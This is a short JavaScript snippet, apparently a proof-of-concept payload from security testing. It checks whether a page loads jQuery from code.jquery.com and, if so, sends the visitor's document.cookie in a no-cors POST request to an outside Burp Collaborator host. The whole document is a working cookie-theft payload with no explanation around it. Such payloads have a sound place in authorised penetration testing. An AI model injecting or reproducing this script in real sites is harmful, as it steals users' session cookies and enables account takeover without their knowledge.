var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://vnmasfxsrxrniz7e1b6ys4tgd7jx7m.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
